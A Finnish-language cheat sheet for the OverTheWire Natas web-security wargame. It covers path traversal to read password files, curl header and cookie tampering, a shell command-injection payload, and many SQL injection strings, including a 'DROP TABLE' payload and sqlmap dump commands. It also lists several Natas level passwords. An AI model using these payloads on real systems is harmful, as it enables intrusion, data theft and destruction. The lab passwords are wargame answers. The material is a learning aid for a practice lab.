# Natas lunttilapput

Eli perus harjoittuksien kannalta kertyy ja taso menee vaikeammaksi ja vaikeammaksi. Listataan olennaiset tarkistukset, ettei ole vain yht√§ tapaa;

- tarkista sivuston koodit ja onko siell√§ vihejeit√§ joko avamalla F12, tai joko sivustolta oikea hiirell√§ "inspect" - ja katso onko koodissa mit√§√§n `username:password`
  - tarkista onko tiedoston polussa mit√§√§n polkuaja kuten `/file/image.jpg`, eli poista image.jpg , ja mene `/file`- polkuun, ja tarkista onko mahdollista olla .txt tiedostoa tai muuta arkistoa
  - lis√§√§ url polkuun `/robots.txt` , jos ois robots tiedosto, niin siell√§ voi lukea lis√§ vinkkej√§. Todellisuudessaan kaikilla sivustoilla ei ole robots.txt-tiedostoa, koska sen k√§ytt√∂ ei ole pakollista. Jotkut haluavat hakukoneiden indeksoivan kaiken, kun taas toiset eiv√§t tarvitse erityisi√§ rajoituksia. Ilman t√§t√§ tiedostoa hakukoneet voivat silti yritt√§√§ indeksoida kaikki l√∂ydett√§viss√§ olevat sivut, ellei muita estomekanismeja ole k√§yt√∂ss√§.
  - muutamissa tasoissa on **view sourcecode**, joka kertoo t√§m√§n tason vihjeit√§ se ohjeistaa usein uuden v√§lilehden `/index-source.html`, ja siell√§ voi olla pient√§ apua hakkerille, ett√§ miten purettaan seuraavan tason salasansa.
  - kantsii testata onko mahdollista k√§ytt√§√§ injektiota p√§√§st√§kseen selvitt√§√§ Natas tiedostohakemistoa ja sit√§ juurta `/etc/natas_webpass/natasX` - T√§m√§ my√∂s p√§tee URL per√§√§n, ett√§ voiko/kertoa vihjeit√§ tallennettun tiedoston polkua, ett√§ menee t√§h√§n hakemistoon. esim. `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8`

## curl komentoja

k√§ytett√§√§n -Headeri referenssi√§ , ja t√§ss√§ muutama ovat melko samoja, mutta jotekin se objekti/nimi/muuttuja on eriss√§ j√§rjestyksess√§ mutta idea on sama;'

- T√§m√§ voisi olla pohja ja nopealla, ettei turhia pitki√§ curl komentoja: <br>
`curl http://natas25.natas.labs.overthewire.org/ --user natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`

- Ensimm√§isen linkkiss√§ on halutaan menn√§ seuraavaan leveliin, ja j√§lkimm√§isess√§ on nykyinen level ja se level salasansa jonka saattiin selville ja siksi t√§ss√§ lukee (a)natas4-level;  <br>
`$curl -Headers "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- t√§m√§ on sama kuin ylempi, mutta lyhyempi ja tiivistettyn√§ vain -H tarkoittaa header; <br>
`$curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org`

- t√§ss√§kin ekana on toistettaan se nykyinen level ja se salasansa, ett√§ haettaan seuraava leveli; <br>
`$curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org`

- t√§ss√§ komennossa tapahtuu ensimm√§isen√§ -u k√§ytt√§j√§n autentikoinnin vahvistaminen `<username:password`, seuraavaksi `-b` niin l√§hett√§√§ HTTP-pyynn√∂n mukana ev√§steen joka on nimetty uusi data="VALUE". T√§t√§ data kantsii tarkistaa sivuston ev√§steen nimest√§, koska se nimi saatta olla nimetty muulla nimityksell√§. L√§hetetyn t√§m√§n pyynn√∂n j√§lkeen se tallentuu siihen istuntoon ja kannattaa p√§ivitt√§√§ sivustoa, ett√§ muuttuiko mit√§√§n. 
`curl -u "natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" -b "data=<NewValue>" http://natas11.natas.labs.overthewire.org/`


- T√§ss√§ versiossa tapahtuu l√§hett√§√§ POST `-d` formaatti kentt√§√§n jos on ja vaikuttaa nime√§miseen, sitten k√§ytt√§en shell/linux komennon  injektiota ja sit vaan submit=submit (t√§t√§ kantsii tarkistaa HTML formaatti nime√§mist√§) ja -H palvelimen **Referer** headeri√§, sitte -u k√§ytt√§j√§n autentikoinnin vahvistamista.
`curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org`



## ev√§steen hakeminen ja tarkistus

Oletuksena sivustosta voi tarkistaa ev√§steen esim. Chrome DEV ty√∂kalusta ja steppi menee: (F12/ oikea hiiren klikkaus **inspect**), sielt√§ v√§lilehdest√§ kuin **application** --> **storage** >> **cookies** ja sielt√§ listasta valitsee t√§m√§n kyseisen sivuston mukaisen mit√§ datoja l√∂ytyy. 

T√§m√§ on esimerkki (alempi kuva), mutta idea on sama ja tuotannossa *cookies* listauksia voi olla enemm√§n kuin yksi:
![alt text](./kuvat/level5-7.1.png)


loggin muutettu 0 (false) --> 1 (true)

T√§m√§n komenton suorittamiseen vaattii sen nykyisen levelin salasansa, jotta saa kerr√§tty√§ sen ev√§steet; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -c natas5_cookie.txt` 

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                                                        
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        0
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ cat natas5_cookie.txt                         
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

natas5.natas.labs.overthewire.org       FALSE   /       FALSE   0       loggedin        1
```

Ylemm√§n muutettun loggin=1:seksi, niin sitten suoritettaan ja haettaan sit√§ seuraavan levelin salasannsa; <br>
`$curl http://natas5.natas.labs.overthewire.org/ -u natas5 -b "natas5_cookie.txt"`

---


Ev√§steen tarkistaminen ja muuttaminen, ett√§ josta voi tomia kuin pikainen tarkistus.

Riippuu jos on kirjautunut admin admin niin antaa special dekoodattu dataa tai muulla salakielell√§, mutt voi normaalisti tehd√§ tarkistuksensa ja t√§ss√§ on pari esimerkki√§.

![alt text](./kuvat-level16-20/natas19-2.png)

![alt text](./kuvat-level16-20/natas18-9.png)

Tosiaan riitt√§√§ kopsaa sen ev√§steen kirjauttuneen <value> ja liitt√§√§ tuohon alle, eli `echo -n <COOKIES_VALUE> | xxd -r -p`
<br>
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ echo -n 3131392d61646d696e | xxd -r -p                             
119-admin                                                                                                                                                      
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ echo -n 39342d61646d696e | xxd -r -p
94-admin                                                                                                                                                                   
```

---

# s3cr3t

Miksi salasana on `s3cr3t`?
Salasana s3cr3t on todenn√§k√∂isesti tarkoituksellisesti manipuloitu muoto sanasta "secret". Se on yleinen tapa piilottaa salasana tai arvo tekem√§ll√§ pieni√§ muunnelmia, kuten vaihtamalla kirjaimia numeroiksi tai muiksi merkeiksi (t√§ss√§ tapauksessa "e" on vaihdettu "3":ksi). T√§llaista k√§ytet√§√§n usein tietoturvahaasteissa, joissa pit√§√§ tunnistaa salasanan muodostustapa.

Mik√§ t√§ss√§ voisi paljastaa, ett√§ salasana on "s3cr3t"?
- "debug" parametri: Jos palvelin on konfiguroitu palauttamaan debug-tietoja, se voi antaa vihjeit√§ siit√§, miksi juuri tietynlaista k√§ytt√§j√§tunnusta ja salasanaa yritet√§√§n. Esimerkiksi palvelin saattaa paljastaa virheviestej√§, jotka kertovat, miksi kirjautuminen ep√§onnistuu tai mihin kohtiin salasana vaikuttaa.

- Salasanan muunnos: Haasteessa saattaa olla selke√§ logiikka, jossa k√§ytt√§j√§n salasanan pit√§√§ olla tavallista muunneltu (kuten "secret" -> "s3cr3t"). T√§llaista k√§ytet√§√§n usein ohjelmoinnissa, koska se on helppo tapa h√§m√§rt√§√§ oikea salasana, mutta se on silti tunnistettavissa.


---

# SQL Injection Lunttilappu ‚Äì Perusteet & Harjoittelu - START HERE;

## üîë Erikoismerkit ja niiden tarkoitus

| Merkki  | K√§ytt√∂tarkoitus                          | SQL-vaikutus                        |
|---------|-------------------------------------------|-------------------------------------|
| `'`     | Sulkee yksitt√§isen lainauksen            | Rikkoo `'value'` ‚Üí `'value' OR ...` |
| `"`     | Sulkee tuplalainauksen                   | Rikkoo `"value"` ‚Üí `"value" OR ...` |
| `--`    | SQL-kommenttimerkki                      | Kommentoi loppu rivist√§ pois        |
| `OR 1=1`| Aina tosi ehto                            | Ohittaa salasanatarkistuksen        |

---

## üåê URL-enkoodaus (tarvitaan GET-parametreissa)

| Merkki   | Enkoodattu muoto |
|----------|------------------|
| `'`      | `%27`            |
| `"`      | `%22`            |
| ` `      | `%20`            |
| `=`      | `%3D`            |
| `--`     | `%2D%2D` tai `--`|

---

## üß™ K√§yt√§nn√∂n esimerkkitestit

| Testitapa     | Sy√∂te                                         | Selitys                                |
|---------------|-----------------------------------------------|----------------------------------------|
| Lomake        | `admin" OR 1=1 --`                            | Username-kentt√§√§n sy√∂tetty injektio    |
| Lomake        | `x`                                           | Password-kentt√§ voi olla mit√§ vain     |
| URL (enkoodattu) | `username=admin%22%20OR%201%3D1%20--&password=x` | Sama injektio URL-parametrina          |
| Curl POST     | `curl -u user:pass -d "username=admin\" OR 1=1 --&password=x" http://target` | L√§hett√§√§ injektion POSTina             |

---

## ‚úÖ Vinkit harjoitteluun ja etenemisen ajattelu

- Aloita yksinkertaisilla injektioilla: `' OR 1=1 --`
- Kokeile molempia: `'` ja `"` eri sy√∂tekentiss√§
- Tarkkaile virheilmoituksia (esim. `bool given`, SQL error)
- Kommentti `--` on t√§rke√§ katkaisemaan loppulause

### Etenemisen portaikkoa ja vaiheittain

Periaatteessa alkaa l√§htee loogisesti, k√§yt√§nn√∂llisesti ja portaikkoina niin kokeillee esim. alkuun onko k√§ytt√§j√§tunnus + salasana `admin` . Jos ei ole niin sitten alkaa sy√∂ttelee erikoismerkkej√§ mm. `"` tai `'` , tai molemmat yhdistettyn√§ eli `"'` - huomoithan se on yhteen. Jos k√§ytt√§j√§ tunnus ei oiskaan admin - voihan kokeillan muita satunnaisia arvoja mm. `test`, `user`, `root`, `1=1` ja `abc'`ja jne. 

T√§m√§ taulukko kuvaa SQL-injektion testauksen ja hy√∂dynt√§misen etenemist√§ vaiheittain. Jokainen vaihe rakentuu edellisen p√§√§lle, mahdollistaen syvemm√§n ymm√§rryksen ja tehokkaamman testauksen.

| Vaihe | Taso                      | Tarkoitus / Toiminta                                                  | Esimerkkej√§                                                         |
|-------|---------------------------|------------------------------------------------------------------------|----------------------------------------------------------------------|
| 1     | üîç Haavoittuvuuden tunnistus | Testaa p√§√§seek√∂ sy√∂te SQL-kyselyyn                                    | `'` , `"` , `admin'`                                                 |
| 2     | üõ†Ô∏è Perus injektio         | Riko rakenne ja ohita kirjautuminen                                   | `admin' OR 1=1 --` , `admin" OR 1=1 --`                              |
| 3     | üåê URL-testit             | Sama injektio URL-parametreissa (enkoodattuna)                        | `username=admin%27%20OR%201%3D1%20--&password=x`                     |
| 4     | üß™ Muunnelmat             | Eri ehto- ja rakennevariaatiot                                        | `OR 'a'='a'` , `OR 1=1 LIMIT 1` , `OR 1=1#`                          |
| 5     | üß± Rakenneanalyysi        | Testaa montako saraketta, miss√§ kohtaa lause menee rikki              | `ORDER BY 1` , `ORDER BY 2` , sulkujen rikkominen                   |
| 6     | üß© UNION SELECT -hy√∂kk√§ys | Yhdist√§ omia valintoja SQL:√§√§n, yrit√§ hakea k√§ytt√§j√§tietoja            | `UNION SELECT 1,2 --` , `UNION SELECT username, password FROM users --` |
| 7     | üîÑ Automatisointi (sqlmap)| Automatisoi kaikki yll√§ olevat vaiheet ja hae tietokantatietoja        | `sqlmap -u "http://target?username=*" --dbs`


T√§m√§ on pieni lunttilappu SQL injektion osuus (sqlmap) kuin tarkistuksena jos l√∂ytyy tietokanta:

```
sqlmap -u "http://natas27.natas.labs.overthewire.org/" \
--auth-type Basic --auth-cred "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
--data "username=test&password=test" \
--batch --level=5 --risk=3 --dbs
```

- jos injkeito l√∂ytyy niin lis√§t√§√§n tietokanna nimen: --dbs
- jos tietokanta l√∂ytyy sitten lis√§t√§√§n per√§√§n: --tables -D <tietokannan_nimi>
- ja viimeisen√§ dumppaus ulos jos l√∂ytyy ja lis√§t√§√§n per√§√§n: --dump -D <tietokanta> -T users


T√§m√§ on yksinkertaisempi komento, mutta yleisell√§ tarkistuksella jos tarkistaa onko sivuston alla tietokantaa: 
```
sqlmap -u "http://example.com/page.php?id=1" --batch --dbs
```

- URL sis√§lt√§√§ GET-parametrin (esim. ?id=1)
- Palvelin ei vaadi autentikointia
- Parametri on oikeasti k√§yt√∂ss√§ taustalla SQL-kyselyss√§
- Hyv√§ kevyt testaus GET-parametrille, mutta ei riit√§ POST-lomakkeisiin tai suojattuihin sivuihin ja hyv√§ testauksena, ei v√§ltt√§m√§tt√§ ehk√§ suoraan anna vastausta mutta hyv√§ testin√§ alkuunkin.



**muita hyvi√§ testauspolku GET-parametrille** ja toimia hyvin lunttilappuna, mik√§li jos l√∂yt√§√§ tietokantansa: 

1. Kevyt testaus:
```
sqlmap -u "http://example.com/page.php?id=1" --batch
```

2. Syvempi analyysi:
```
sqlmap -u "http://example.com/page.php?id=1" --batch --level=5 --risk=3 --dbs
```

3.Taulujen listaus (jos tietokanta l√∂ytyy):
```
sqlmap -u "http://example.com/page.php?id=1" --batch -D tietokanta_nimi --tables
```

Muu Bonus: Parametrien automaattinen haku:
```
sqlmap -u "http://example.com/" --forms --crawl=2 --batch
```

---

## üìå Vinkit etenemiseen:

- üî∏ Testaa ensin manuaalisesti (lomake tai URL)
- üî∏ Tarkkaile virheilmoituksia (esim. SQL-syntaksivirheit√§)
- üî∏ K√§yt√§ oikeita enkoodauksia URL:issa
- üî∏ Dokumentoi, mik√§ toimii miss√§kin vaiheessa

---

## üìå Esimerkkilause SQL:ss√§

```
SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="salasana"
```

# SQL Injection ‚Äì Vaihtoehtoiset esimerkit k√§ytt√§j√§nimell√§ `admin` - START HERE

| Sy√∂te                            | Tarkoitus / Kommentti                                             |
|----------------------------------|-------------------------------------------------------------------|
| `admin" OR 1=1 --`               | Klassikko ‚Äì sulkee " ja ohittaa salasanan                        |
| `admin' OR 1=1 --`               | Sama idea mutta yksitt√§isell√§ `'`-merkill√§                       |
| `admin" OR '1'='1' --`           | Sama kuin yll√§, mutta kirjaimellisesti tosi ehto                |
| `admin" OR 1=1#`                 | Joissain tietokannoissa `#` toimii kommenttina (`--` sijaan)     |
| `admin') OR ('1'='1`             | K√§ytet√§√§n joskus, kun sis√§kk√§isi√§ sulkuja on kyselyss√§           |
| `admin" OR 1=1 LIMIT 1 --`       | Rajoittaa tuloksia (joissain tapauksissa hy√∂dyllinen)            |
| `admin" UNION SELECT 1,2 --`     | UNION hy√∂kk√§ys (jos haetaan useita kentti√§)                      |
| `admin"; DROP TABLE users --`    | Tuhovaikutus (jos SQL on huonosti suojattu)                      |

---

## Huomioita

- `admin` voi olla mik√§ tahansa tunnettu k√§ytt√§j√§nimi ‚Äì ideana on sulkea alkuper√§inen `"admin"` ja lis√§t√§ oma ehto per√§√§n.
- `--` kommentoi loppuosan, jolloin esim. `AND password="..."` ei en√§√§ vaikuta.
- V√§lily√∂nnit t√§ytyy **enkoodata URL:issa** (`%20`) ja erikoismerkit kuten `"`, `'`, `=` vastaavasti.

---

## Esimerkki URL:ina (enkoodattuna)

HTML: `/index.php?username=admin%22%20OR%201%3D1%20--&password=x` 

ja vastaa t√§h√§n SQL muodossa: `SELECT * FROM users WHERE username="admin" OR 1=1 --" AND password="x"`

--- 

# üß™ SQL Injection Curl-Komennot ‚Äì Lunttitaulukko

T√§ss√§ taulukossa on eri tapoja k√§ytt√§√§ `curl`-komentoa SQL-injektiotestauksessa. Mukana GET- ja POST-esimerkit sek√§ lomake- ja URL-parametrien k√§ytt√∂.

| Muoto       | Kuvaus                              | Komento                                                                                             |
|-------------|--------------------------------------|------------------------------------------------------------------------------------------------------|
| ‚úÖ GET       | Perus injektio URL-parametrina      | `curl "http://target.site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`                 |
| ‚úÖ POST      | L√§hett√§√§ tiedot lomakekentist√§      | `curl -X POST -d "username=admin' OR 1=1 --&password=x" http://target.site/index.php`                |
| üîê HTTP Auth| Peruskirjautuminen (esim. natas)     | `curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 "http://natas14.natas.labs.overthewire.org"`       |
| üåê GET + Auth| GET-injektio autentikoinnilla        | `curl -u user:pass "http://site/index.php?username=admin%27%20OR%201%3D1%20--&password=x"`           |
| üß™ POST + Auth| POST-injektio autentikoinnilla       | `curl -u user:pass -X POST -d "username=admin' OR 1=1 --&password=x" http://site/index.php`          |
| üìù Enkoodattu| K√§ytt√§√§ URL-enkoodattuja arvoja      | `curl "http://site/index.php?username=admin%22%20OR%201%3D1%20--&password=x"`                        |
| üß™ UNION     | UNION SELECT -testi                  | `curl -X POST -d "username=admin' UNION SELECT 1,2 --&password=x" http://target.site/index.php`      |

---

## üìå Vinkkej√§:

- K√§yt√§ `--data` tai `-d` POST-pyynn√∂iss√§ (`application/x-www-form-urlencoded` oletus).
- K√§yt√§ `-u` jos kohde vaatii HTTP basic authentication.
- Enkoodaa erikoismerkit GET-parametreissa (`'` = `%27`, `"` = `%22`, v√§lily√∂nti = `%20`).
- Lis√§√§ `?debug=1` tai vastaava jos sivusto tukee virheen tulostamista.

```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
     -d "username=admin' OR 1=1 --&password=x" \
     http://natas14.natas.labs.overthewire.org/index.php
```


















